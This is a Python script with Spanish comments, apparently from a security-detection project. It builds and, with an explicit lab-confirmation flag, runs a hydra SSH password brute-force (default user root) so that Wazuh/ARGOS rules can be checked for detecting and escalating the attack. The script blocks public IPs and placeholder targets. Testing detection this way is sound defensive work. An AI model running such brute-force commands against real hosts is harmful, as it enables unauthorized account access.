#!/usr/bin/env python3
"""
ssh_bruteforce_controlled.py — Simulador controlado de fuerza bruta SSH (MITRE T1110).

Mismo patrón seguro que uc06_ddos_controlled.py / uc08_sqli_controlled.py: construye el
comando de `hydra` pero NO lo ejecuta por default. Solo lo imprime; requiere
--i-confirm-this-is-my-lab para correrlo de verdad, y solo contra un host que el operador
designe explícitamente por --target (nunca IPs públicas, nunca el placeholder).

Sirve para validar de punta a punta que ARGOS detecta y responde a un brute-force SSH real
(Fase 6): el ataque dispara la regla nativa de Wazuh (multiple auth failures), la regla hija
de ARGOS la etiqueta como Layer 1 / T1110, y el pipeline lleva el incidente a Tier 2
(aprobación humana).

Uso:
    python ssh_bruteforce_controlled.py --target <TARGET_SSH_HOST>
    python ssh_bruteforce_controlled.py --target 10.0.0.10 --user labuser --i-confirm-this-is-my-lab
"""
from __future__ import annotations

import argparse
import ipaddress
import shlex
import subprocess
import sys
from pathlib import Path

# Rangos públicos conocidos que nunca deben ser objetivo (misma validación que uc06/uc08).
_BLOCKED_RANGES = [
    "8.8.8.0/24",
    "1.1.1.0/24",
]
_PLACEHOLDER = "<TARGET_SSH_HOST>"
_DEFAULT_WORDLIST = Path(__file__).parent / "wordlists" / "ssh-lab-passwords.txt"


def _looks_like_placeholder(value: str) -> bool:
    return "TARGET_SSH_HOST" in value.upper()


def _validate_target(target: str) -> None:
    """Aborta si el target es el placeholder, una IP pública o un rango bloqueado."""
    if _looks_like_placeholder(target):
        raise SystemExit(
            f"[!] Reemplaza {_PLACEHOLDER} en --target por el host de prueba real "
            "(un host/contenedor descartable que vos controles)."
        )
    if not target.strip():
        raise SystemExit("[!] --target vacío.")

    try:
        ip = ipaddress.ip_address(target)
    except ValueError:
        print(f"[*] Target '{target}' no es IP literal; se asume hostname interno del lab.")
        return

    for blocked_range in _BLOCKED_RANGES:
        if ip in ipaddress.ip_network(blocked_range):
            raise SystemExit(
                f"[!] '{target}' cae en un rango bloqueado conocido ({blocked_range}). Abortando."
            )
    if ip.is_global:
        raise SystemExit(
            f"[!] '{target}' parece una IP pública. Este simulador solo corre contra un host "
            "de prueba propio (privado/interno). Abortando."
        )


def build_hydra_command(
    target: str, user: str, wordlist: str, port: int, tasks: int
) -> list[str]:
    """Comando hydra para brute-force SSH. `-f` para al primer acierto; `-t` acota paralelismo."""
    return [
        "hydra",
        "-l", user,
        "-P", wordlist,
        "-t", str(tasks),
        "-f",
        f"ssh://{target}:{port}",
    ]


def main() -> int:
    # Salida UTF-8 segura (consola Windows cp1252 crashea con los emojis de lab).
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8")

    parser = argparse.ArgumentParser(
        description="Simulador controlado de fuerza bruta SSH (T1110) — solo contra tu host de prueba."
    )
    parser.add_argument("--target", required=True, help=f"host/IP de prueba (reemplazá {_PLACEHOLDER})")
    parser.add_argument("--user", default="root", help="usuario a atacar (default root)")
    parser.add_argument("--port", type=int, default=22, help="puerto SSH (default 22)")
    parser.add_argument("--tasks", type=int, default=4, help="conexiones paralelas de hydra (default 4)")
    parser.add_argument(
        "--wordlist",
        default=str(_DEFAULT_WORDLIST),
        help="lista de passwords (default: lista mínima de lab bundleada)",
    )
    parser.add_argument(
        "--i-confirm-this-is-my-lab",
        action="store_true",
        help="requerido para ejecutar de verdad; sin esto, solo se muestra el comando.",
    )
    args = parser.parse_args()

    _validate_target(args.target)
    cmd = build_hydra_command(args.target, args.user, args.wordlist, args.port, args.tasks)

    print("=" * 70)
    print("⚠️  COMANDO DE LABORATORIO — SOLO CONTRA TU HOST DE PRUEBA DESCARTABLE  ⚠️")
    print("=" * 70)
    print(shlex.join(cmd))
    print("=" * 70)

    if not args.i_confirm_this_is_my_lab:
        print(
            "[*] Modo 'solo mostrar' (default). Para ejecutar de verdad, volvé a correr con "
            "--i-confirm-this-is-my-lab (y con go-ahead explícito en la validación de Fase 6)."
        )
        return 0

    if not Path(args.wordlist).exists():
        print(f"[!] Wordlist no encontrada: {args.wordlist}")
        return 1

    print("[*] Ejecutando hydra contra el host de prueba confirmado...")
    try:
        subprocess.run(cmd, check=True, timeout=300)
    except FileNotFoundError:
        print("[!] hydra no está instalado en este entorno. Instalalo en tu host de trabajo del lab.")
        return 1
    except subprocess.CalledProcessError:
        # hydra devuelve no-cero si no encontró credenciales — no es un error del simulador.
        print("[*] hydra terminó (sin acierto o interrumpido).")
    except subprocess.TimeoutExpired:
        print("[*] Comando detenido por timeout de seguridad (300s).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
